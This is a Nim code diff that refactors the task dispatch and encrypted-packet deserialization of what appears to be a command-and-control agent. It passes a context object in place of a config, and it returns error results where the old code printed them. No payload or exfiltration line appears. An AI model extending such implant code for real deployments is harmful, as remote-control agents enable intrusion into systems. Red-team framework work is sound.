@@ -1,15 +1,16 @@
 import strutils, tables, json, strformat, sugar
 
+import ./result
 import ../../modules/manager
 import ../../common/[types, serialize, sequence, crypto, utils]
 
-proc handleTask*(config: AgentConfig, task: Task): TaskResult = 
+proc handleTask*(ctx: AgentCtx, task: Task): TaskResult = 
     try: 
-        return getCommandByType(cast[CommandType](task.command)).execute(config, task)
+        return getCommandByType(cast[CommandType](task.command)).execute(ctx, task)
     except CatchableError as err: 
-        echo "[-] Invalid command. " & err.msg 
+        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
-proc deserializeTask*(config: AgentConfig, bytes: seq[byte]): Task = 
+proc deserializeTask*(ctx: AgentCtx, bytes: seq[byte]): Task = 
 
     var unpacker = Unpacker.init(Bytes.toString(bytes))
 
@@ -20,7 +21,7 @@ proc deserializeTask*(config: AgentConfig, bytes: seq[byte]): Task =
 
     # Decrypt payload 
     let payload = unpacker.getBytes(int(header.size))
-    let decData= validateDecryption(config.sessionKey, header.iv, payload, header.seqNr, header)
+    let decData= validateDecryption(ctx.sessionKey, header.iv, payload, header.seqNr, header)
 
     # Deserialize decrypted data
     unpacker = Unpacker.init(Bytes.toString(decData))
@@ -50,7 +51,7 @@ proc deserializeTask*(config: AgentConfig, bytes: seq[byte]): Task =
         args: args
     )
 
-proc deserializePacket*(config: AgentConfig, packet: string): seq[Task] = 
+proc deserializePacket*(ctx: AgentCtx, packet: string): seq[Task] = 
 
     result = newSeq[Task]()
 
@@ -68,6 +69,6 @@ proc deserializePacket*(config: AgentConfig, packet: string): seq[Task] =
             taskLength = unpacker.getUint32() 
             taskBytes = unpacker.getBytes(int(taskLength))
 
-        result.add(config.deserializeTask(taskBytes))
+        result.add(ctx.deserializeTask(taskBytes))
         
         dec taskCount
